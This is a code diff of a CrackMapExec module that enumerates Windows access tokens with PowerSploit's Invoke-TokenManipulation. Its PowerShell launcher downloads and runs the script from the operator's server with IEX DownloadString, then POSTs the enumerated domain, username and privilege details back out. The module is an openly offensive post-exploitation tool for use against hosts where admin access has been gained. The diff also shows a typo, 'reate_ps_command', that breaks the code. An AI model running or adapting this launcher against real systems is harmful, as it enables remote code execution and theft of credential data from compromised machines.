@@ -1,4 +1,4 @@
-from cme.helpers import create_ps_command, obfs_ps_script, gen_random_string, get_ps_script, write_log
+from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script, write_log
 from datetime import datetime
 from StringIO import StringIO
 import os
@@ -13,6 +13,8 @@ class CMEModule:
     name = 'tokens'
 
     description = "Enumerates available tokens using Powersploit's Invoke-TokenManipulation"
+
+    chain_support = False
 
     def options(self, context, module_options):
         '''
@@ -39,13 +41,10 @@ class CMEModule:
 
             self.userfile = path
 
-        self.obfs_name = gen_random_string()
-
-    def on_admin_login(self, context, connection):
-
-        payload = '''
+    def launcher(self, context, command):
+        launcher = '''
         IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
-        $creds = Invoke-{func_name} -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
+        $creds = Invoke-TokenManipulation -Enumerate | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
         $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
         $request.Method = 'POST';
         $request.ContentType = 'application/x-www-form-urlencoded';
@@ -56,22 +55,24 @@ class CMEModule:
         $requestStream.Close();
         $request.GetResponse();'''.format(server=context.server, 
                                           port=context.server_port, 
-                                          addr=context.localip,
-                                          func_name=self.obfs_name)
+                                          addr=context.localip)
 
-        context.log.debug('Payload: {}'.format(payload))
-        payload = create_ps_command(payload)
-        connection.execute(payload)
-        context.log.success('Executed payload')
+        return reate_ps_command(launcher)
 
-    def on_request(self, context, request):
+    def payload(self, context, command):
+        with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
+            return obfs_ps_script(ps_script.read())
+
+    def on_admin_login(self, context, connection, launcher, payload):
+        connection.execute(launcher)
+        context.log.success('Executed launcher')
+
+    def on_request(self, context, request, launcher, payload):
         if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
 
-            with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
-                ps_script = obfs_ps_script(ps_script.read(), self.obfs_name)
-                request.wfile.write(ps_script)
+            request.wfile.write(payload)
 
         else:
             request.send_response(404)
